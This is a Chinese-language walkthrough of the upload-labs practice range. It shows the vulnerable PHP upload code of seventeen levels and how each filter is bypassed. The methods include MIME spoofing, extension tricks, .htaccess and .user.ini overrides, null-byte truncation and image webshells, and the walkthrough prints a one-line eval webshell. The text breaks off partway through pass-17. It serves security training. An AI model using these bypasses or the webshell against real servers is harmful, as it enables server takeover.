# upload-labs

## 一、摘要

项目地址： [https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

![&#x9776;&#x673A;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;](../../.gitbook/assets/image%20%28608%29.png)

![&#x5224;&#x65AD;&#x4E0A;&#x4F20;&#x7C7B;&#x578B;](../../.gitbook/assets/image%20%28614%29.png)



## 二、关卡及说明

### pass-01-JS校验

 **说明**：该关卡在前端在JS中对上传文件的后缀进行限制

####  步骤

1、点击F12或查看源码，可看到JavaScript字段，其中对可上传文件后缀做了限制

```javascript
<script type="text/javascript">
    function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif";
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
</script>
```

2、上传步骤如下：

{% tabs %}
{% tab title="方法一" %}
1、使用burp抓包，在返回包中去掉JavaScript字段，然后放包

![](../../.gitbook/assets/image%20%28613%29.png)

2、直接在页面中选择 XX.php 的文件，上传

![](../../.gitbook/assets/image%20%28615%29.png)

3、新标签中打开文件，即可看到上传好的文件

![](../../.gitbook/assets/image%20%28606%29.png)
{% endtab %}

{% tab title="方法二" %}
1、在本地文件夹中，将 .php 后缀的文件改为 .jpg 等后缀，打开 burp 抓包然后点击上传

2、在burp中，将所上传 .jpg 后缀的文件更换回 .php ，点击放包

![](../../.gitbook/assets/image%20%28612%29.png)

3、在新标签中打开文件，可看到上传好的文件

![](../../.gitbook/assets/image%20%28606%29.png)
{% endtab %}
{% endtabs %}

#### 思考

 1、说了这么多，那么为什么程序员开发代码时候会使用前端校验的方式，是他们不清楚前端校验很容易被绕过吗？当然不是。之所以使用前端校验，主要是因为效率高，用户体验好，如果所有的数据都发送给服务器，服务器校验后再发给客户端，这中间需要消耗时间，用户体验就变得不好。但这种校验方式的开发的初衷是针对中规中矩的普通用户，当面对黑客这类群体时候就变得形同虚设。

2、那么我们深入再思考一点，对于CS架构的游戏类开发，其实很多数据也是通过客户端进行校验的，因为游戏类产品，人物的复杂运动会产很多复杂的数据，这些数据如果全部提交给服务器校验，显然会对服务器造成很大处理压力，因此，程序员在开发时候，对一些安全要求不高，对速度要求很高的数据校验都是写在客户端进行校验的，当然，这也是游戏外挂编写的基本思路，其实还是那句老话，**所有客户端的数据输入校验都是可以绕过的**。

3、写到最后，实际编程开发中我们应该在安全开发方面注意哪里点呢。其实，从上面的分析就可以得出结论，一是不能只有前端校验，没有后端校验，对于一些可能重大影响程序结果的数据，最好使用前后端结合的校验方式，即保证用户体验，又保障程序安全。另外，在游戏、app等客户端开发时，我们可以通过混淆、加密、加壳等手段尽量防止客户端使用者对关键数据和算法进行逆向分析。

### pass-02-MIME校验

本关卡源码如下：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

根据提示，该关卡在服务端对文件的[MIME](https://baike.baidu.com/item/MIME/2900607?fr=aladdin)进行了校验。

从源码中，可看出该关卡允许的MIME为：

```php
image/jpeg
image/png
image/gif
```

![pass01&#x4E3A;&#x4F8B;](../../.gitbook/assets/image%20%28611%29.png)

1、故在上传文件时，只需要将 .php 文件中的`Content-Type`部分更改为允许的MIME即可，如下图

![&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x653E;&#x5305;](../../.gitbook/assets/image%20%28616%29.png)

2、新标签页中打开文件，如图：

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-03-后缀校验

该关卡源码如下：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 该关卡采用了验证文件后缀的方式，其中，.asp,.aspx,.php,.jsp 为不可上传的文件后缀。且上传后，文件名会被修改

1、基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。   
2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。

但是可以其他后缀名嘛，例如php1、php2、phtml、php5等等。

步骤：

1、将本地的 .php后缀文件上传，同时抓包

2、在burp中更改所上传文件后缀为 .php5 ，并放包

3、收到返回包后，查看经程序修改后的文件名

![](../../.gitbook/assets/image%20%28609%29.png)

4、访问文件

![](../../.gitbook/assets/image%20%28617%29.png)

说明：若上传文件后发现访问不了，可能原因有phpstudy的Apache配置文件原因。原配置文件限制了后缀，更改为 `AddType application/x-httpd-php .php .phtml .php3 .php4` 即可。记得重启服务！记得重启服务！记得重启服务！

![](../../.gitbook/assets/image%20%28610%29.png)

### pass-04-.hatccess

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 该关卡使用黑名单验证，禁止上传的后缀有：

```text
".php",".php5",".php4",".php3",".php2",".php1",".pHp",
".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".html",".htm",
".phtml",".pht",".Html",".Htm",".pHtml",".jsp",".jspa",
".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",
".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",
".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",
".aSpx",".aSa",".aSax",".aScx",".aShx",
".aSmx",".cEr",".sWf",".swf",".ini"
```

于是，可先上传 .hatccess 文件来进行绕过。

{% tabs %}
{% tab title="文件介绍" %}
htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
{% endtab %}

{% tab title="漏洞条件" %}
* apache服务器
* 能够上传.htaccess文件，一般为黑名单限制。
* AllowOverride All，默认配置为关闭None。
* LoadModule rewrite\_module modules/mod\_rewrite.so \#模块为开启状态
* 上传目录具有可执行权限。
{% endtab %}
{% endtabs %}

```php
# 上传文件内容：
AddType applicaiton/x-httpd-php .jpg

# 大意：上传 .jpg 文件后，其中的内容按照 .php 来解析
```

步骤：（该过程无需burp）

1、上传 .htaccess 文件

2、上传 .jpg 结尾的 php 脚本文件

3、访问文件

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-05-[.user.ini](https://www.jianshu.com/p/c2ed6b05c964)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 从源码中可得，本关使用的黑名单如下：

```text
".php",".php5",".php4",".php3",".php2",
".html",".htm",".phtml",".pht",
".pHp",".pHp5",".pHp4",".pHp3",".pHp2",
".Html",".Htm",".pHtml",
".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",
".jSv",".jSpf",".jHtml",
".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",
".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",
".cEr",".sWf",".swf",
".htaccess"
```

于是，可上传文件如下：

{% tabs %}
{% tab title="1" %}
{% code title=".user.ini" %}
```text
auto_prepend_file=1.gif
```
{% endcode %}

文件大意：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini
{% endtab %}

{% tab title="2" %}
{% code title="1.gif" %}
```php
<?php @eval($_REQUEST['a'])?>
```
{% endcode %}
{% endtab %}
{% endtabs %}

 上传后，使用连接器连接即可。

 注意：phpstudy2016版本默认不会扫描到 .user.ini 文件

### pass-06-后缀大小写

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

由源码可知，本关只是限制了部分后缀，因为上传的脚本文件为PHP的，所以可看到相关限制有：

```text
".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",
".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",
".pHtml",".htaccess",".ini"
```

大小写绕过原理：

* Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。
* Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。

所以，可上传后缀为 .Php 的文件，进行绕过

访问结果如下：

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-07-空格

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 根据源码，可得：

1. 此关卡中大小写无效
2. 限制了一些文件后缀

此时，可在burp中抓包，在文件名后面添加空格，来绕过

Windows系统下，对于文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单。 针对这样的情况需要使用Burpsuite阶段HTTP请求之后，修改对应的文件名 添加空格。

![](../../.gitbook/assets/image%20%28660%29.png)

之后访问文件：

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-08-点号

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 文件上传时，添加点号即可完成绕过。

.号绕过原理：

Windows系统下，文件后缀名最后一个点会被自动去除。

![](../../.gitbook/assets/image%20%28659%29.png)

 完成上传后，访问文件，效果图如下：

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-09-**::$DATA**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

特殊符号绕过原理：

Windows系统下，如果上传的文件名中 `test.php::$DATA` 会在服务器上生成一个 `test.php` 的文件，其中内容和所上传文件内容相同，并被解析。

![](../../.gitbook/assets/image%20%28658%29.png)



![](../../.gitbook/assets/image%20%28617%29.png)

### pass-10-. .

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



![](../../.gitbook/assets/image%20%28663%29.png)

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-11-双写后缀

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关是用str\_ireplace函数将符合黑名单中的后缀名进行替换为空。所以可以双写绕过

![](../../.gitbook/assets/image%20%28670%29.png)

![](../../.gitbook/assets/image%20%28617%29.png)

### pass-12-0x00

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这一关，需要php的版本号低于5.3.29，且magic\_quotes\_gpc为关闭状态。

![](../../.gitbook/assets/image%20%28666%29.png)

### pass-13-0x00

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这一关和Pass-12的区别是，00截断是用在POST中，且是在二进制中进行修改。因为POST不会像GET那样对%00进行自动解码。

![](../../.gitbook/assets/image%20%28662%29.png)

### pass-14-文件头

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

![](../../.gitbook/assets/image%20%28669%29.png)

### pass-15-getimagesize\(\)

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

注：这里可能会有一些问题，就是copy制作的图片马，制作出来后，图像是损坏的，那么15关就过不去。所以可以利用winhex之类的工具，讲一句话加在图片的后面。这样就能过了。

![](../../.gitbook/assets/image%20%28667%29.png)

### pass-16-exif\_imagetype\(\)

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

这一关需要开启php\_exif模块。

![](../../.gitbook/assets/image%20%28667%29.png)

### pass-17-[二次渲染](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

思路：

将上传的图片重新下载下来，放入winhex，进行对比。可以找到二次渲染后不变的地方，而这个地方就是可以插入一句话的地方。

第71行检测`$fileext`和`$filetype`是否为gif格式.

然后73行使用`move_uploaded_file`函数来做判断条件,如果成功将文件移动到`$target_path`,就会进入二次渲染的代码,反之上传失败.

在这里有一个问题,如果作者是想考察绕过二次渲染的话,在`move_uploaded_file($tmpname,$target_path)`返回true的时候,就已经成功将图片马上传到服务器了,所以下面的二次渲染并不会影响到图片马的上传.如果是想考察文件后缀和`content-type`的话,那么二次渲染的代码就很多余.\(到底考点在哪里,只有作者清楚.哈哈\)

由于在二次渲染时重新生成了文件名,所以可以根据上传后的文件名,来判断上传的图片是二次渲染后生成的图片还是直接由`move_uploaded_file`函数移动的图片.

我看过的writeup都是直接由`move_uploaded_file`函数上传的图片马.今天我们把`move_uploaded_file`这个判断条件去除,然后尝试上传图片马.

{% tabs %}
{% tab title="GIF" %}
将`<?php phpinfo(); ?>`添加到111.gif的尾部.

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMDg4YmI0LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地.  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMTI0YTk2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开.  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMWVmMjhjLWFiMjQtMS5wbmc?x-oss-process=image/format,png)

可以发现,我们在gif末端添加的php代码已经被去除.

关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.

经过对比,蓝色部分是没有发生变化的,  


